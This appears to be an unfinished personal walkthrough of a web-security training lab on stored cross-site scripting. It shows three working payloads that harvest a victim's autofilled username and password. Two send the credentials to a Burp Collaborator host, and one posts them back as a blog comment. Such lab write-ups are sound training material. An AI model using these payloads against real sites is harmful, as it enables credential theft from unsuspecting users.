# Lab: Exploiting cross-site scripting to capture passwords

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

**NOTE**

*To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.*

*Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.*

# Step 1 Find XSS vuln in comments function:

Adding a POC payload into a blog-post comment:

![image](https://user-images.githubusercontent.com/83407557/210614348-97de9160-9930-4c86-bfea-04c84d9521cc.png)

When I go back and view my comment, the page tries to print, verifying XSS:

![image](https://user-images.githubusercontent.com/83407557/210614535-9b0d9049-b482-451b-9375-3cc82d9e31b4.png)

# Step 2 Create a password stealing XSS payload

First I need to grab my collaborator's URL:

![image](https://user-images.githubusercontent.com/83407557/210614710-a6c10114-64e1-452b-a59d-bb52087ad3b4.png)

`c3gtx1iww0cl1k1q6psn1ue43v9mxel3.oastify.com`

Then I craft an XSS payload with this URL:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('c3gtx1iww0cl1k1q6psn1ue43v9mxel3.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

# Step 3 use payload in a comment

![image](https://user-images.githubusercontent.com/83407557/210622864-cd81f60d-2a5c-4669-87f0-65a4e901fb36.png)

# Step 4 poll collaborator

Not getting anything, perhaps oastify.com is being blocked. Trying a new payload:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('c3gtx1iww0cl1k1q6psn1ue43v9mxel3.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
![image](https://user-images.githubusercontent.com/83407557/210623680-66df2f4a-1f80-48e9-b289-35da34140c85.png)

# Step 5 Force a blog comment

Since I am not able to get a callback to collaborator, I will try another method, which will force a blog comment containing the info I need for anyone that views my comment:

```html
<form><input type="text" id="username" name="username"></form>
<form><input type="password" id="password" name="password"></form>
<script>
window.onload = function(e) {
    setTimeout(function() {
        var csrf = document.getElementsByName("csrf")[0].value;
        var username = document.getElementById("username").value;
        var passw = document.getElementById("password").value;
        console.log(csrf);
        fetch('https://0ab300de03d7735cc15f3ae80042009b.web-security-academy.net/post/comment', {
            method: 'POST',
            body: 'csrf=' + csrf + '&postId=3&comment=Username: ' + username + ', Password: ' + passw + '&name=victem&email=hermh4cks%40gmail.com&website='
        });
    }, 2500);
};
</script>
```

![image](https://user-images.githubusercontent.com/83407557/210628469-fc659c16-a253-4fc7-90b7-721ec1b1a2b1.png)


Still having issues...come back later


